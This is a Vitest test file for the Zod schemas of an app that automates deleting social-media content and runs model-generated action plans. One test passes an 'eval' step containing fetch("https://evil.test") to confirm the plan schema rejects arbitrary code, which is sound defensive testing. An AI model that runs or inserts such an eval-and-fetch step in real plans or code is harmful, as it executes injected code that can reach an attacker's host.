import { describe, expect, it } from 'vitest';
import {
	ActionPlanSchema,
	AppSettingsSchema,
	BridgeMethods,
	HostMessageSchema,
	LogEntrySchema,
	PushEventSchema,
	RpcResponseSchema
} from './contract';

describe('AppSettingsSchema', () => {
	it('accepts a valid settings payload', () => {
		const result = AppSettingsSchema.safeParse({
			theme: 'Dark',
			language: 'System',
			showIntro: true,
			showLogs: false,
			showX: true,
			showYouTube: true,
			confirmDeletion: true,
			notifications: true,
			debugLogging: false,
			autoConsent: true,
			persistSession: true,
			checkUpdatesOnStart: true,
			themePreset: 'default',
			showAssistant: true,
			assistantSource: 'claude-code',
			assistantCliPath: '',
			engineScript: '',
			assistantModel: '',
			assistantEffort: 'medium',
			customActions: [
				{
					id: 'a1',
					label: 'Drafts',
					platform: 'x',
					place: 'panel',
					plan: {
						kind: 'loop',
						target: { selector: '[data-testid="draft"]' },
						steps: [
							{ step: 'click', target: { selector: '[data-testid="draft-delete"]' } },
							{ step: 'click', target: { selector: '[role="menuitem"]', text: 'delete' } },
							{ step: 'waitGone', target: { selector: '[role="menuitem"]' }, maxWaitMs: 3000 }
						]
					},
					createdAt: '2026-08-08T10:00:00+02:00'
				}
			],
			timeouts: {
				waitAfterDelete: 500,
				waitBetweenRetryDeleteAttempts: 500,
				waitAfterDocumentLoad: 3000
			}
		});
		expect(result.success).toBe(true);
	});

	it('rejects an unknown theme', () => {
		const result = AppSettingsSchema.safeParse({
			theme: 'Neon',
			language: 'System',
			showIntro: true,
			showLogs: false,
			showX: true,
			showYouTube: true,
			confirmDeletion: true,
			notifications: true,
			autoConsent: true,
			persistSession: true,
			timeouts: {
				waitAfterDelete: 500,
				waitBetweenRetryDeleteAttempts: 500,
				waitAfterDocumentLoad: 3000
			}
		});
		expect(result.success).toBe(false);
	});

	it('rejects negative timeout values', () => {
		const result = AppSettingsSchema.safeParse({
			theme: 'Default',
			language: 'System',
			showIntro: true,
			showLogs: false,
			showX: true,
			showYouTube: true,
			confirmDeletion: true,
			notifications: true,
			autoConsent: true,
			persistSession: true,
			timeouts: {
				waitAfterDelete: -1,
				waitBetweenRetryDeleteAttempts: 500,
				waitAfterDocumentLoad: 3000
			}
		});
		expect(result.success).toBe(false);
	});
});

describe('LogEntrySchema', () => {
	it('accepts a well-formed log entry', () => {
		const result = LogEntrySchema.safeParse({
			timestamp: '2026-07-24T12:00:00.000Z',
			level: 'error',
			message: 'JS Error: boom'
		});
		expect(result.success).toBe(true);
	});

	it('rejects a non-ISO timestamp', () => {
		const result = LogEntrySchema.safeParse({
			timestamp: 'not-a-date',
			level: 'info',
			message: 'hi'
		});
		expect(result.success).toBe(false);
	});
});

describe('RpcResponseSchema', () => {
	it('accepts a success response', () => {
		const result = RpcResponseSchema.safeParse({ id: '1', ok: true, result: { deletedCount: 3 } });
		expect(result.success).toBe(true);
	});

	it('accepts an error response', () => {
		const result = RpcResponseSchema.safeParse({ id: '1', ok: false, error: { message: 'boom' } });
		expect(result.success).toBe(true);
	});

	it('rejects a response missing both result and error', () => {
		const result = RpcResponseSchema.safeParse({ id: '1', ok: true });
		expect(result.success).toBe(false);
	});
});

describe('PushEventSchema / HostMessageSchema', () => {
	it('accepts a progress push event', () => {
		const result = PushEventSchema.safeParse({
			event: 'progress',
			payload: { requestId: 'abc', deletedCount: 2 }
		});
		expect(result.success).toBe(true);
	});

	it('rejects an unknown event name', () => {
		const result = PushEventSchema.safeParse({ event: 'boom', payload: {} });
		expect(result.success).toBe(false);
	});

	it('HostMessageSchema accepts both RPC responses and push events', () => {
		expect(HostMessageSchema.safeParse({ id: '1', ok: true, result: {} }).success).toBe(true);
		expect(HostMessageSchema.safeParse({ event: 'settingsChanged', payload: {} }).success).toBe(
			false
		);
	});
});

describe('BridgeMethods', () => {
	it('validates every declared params/result schema is a usable Zod schema', () => {
		for (const [name, spec] of Object.entries(BridgeMethods)) {
			expect(typeof spec.params.parse, `${name}.params should be a Zod schema`).toBe('function');
			expect(typeof spec.result.parse, `${name}.result should be a Zod schema`).toBe('function');
		}
	});
});

/**
 * The plan is the app's answer to running a model's output at all: the vocabulary is fixed,
 * so a wrong plan can only do what the engine could already do. That guarantee is this schema
 * and nothing else, which is why what it refuses matters as much as what it takes.
 */
describe('ActionPlanSchema', () => {
	const good = {
		target: { selector: '[data-testid="unlike"]' },
		steps: [{ step: 'click' as const, target: { selector: '[data-testid="unlike"]' } }]
	};

	it('takes a plan over the vocabulary it knows', () => {
		expect(ActionPlanSchema.safeParse(good).success).toBe(true);
	});

	it('refuses a step it has no primitive for', () => {
		const result = ActionPlanSchema.safeParse({
			...good,
			steps: [{ step: 'eval', code: 'fetch("https://evil.test")' }]
		});

		expect(result.success).toBe(false);
	});

	it('refuses a plan with nothing in it, and one that never ends', () => {
		expect(ActionPlanSchema.safeParse({ ...good, steps: [] }).success).toBe(false);
		expect(
			ActionPlanSchema.safeParse({
				...good,
				steps: [{ step: 'wait', ms: 60 * 60 * 1000 }]
			}).success
		).toBe(false);
	});

	// An index is what makes browser-use's recorded runs worthless on the next render, and it
	// is the one way of naming an element this schema will not carry.
	it('names elements by selector, never by position', () => {
		const result = ActionPlanSchema.safeParse({
			target: { index: 5 },
			steps: good.steps
		});

		expect(result.success).toBe(false);
	});
});
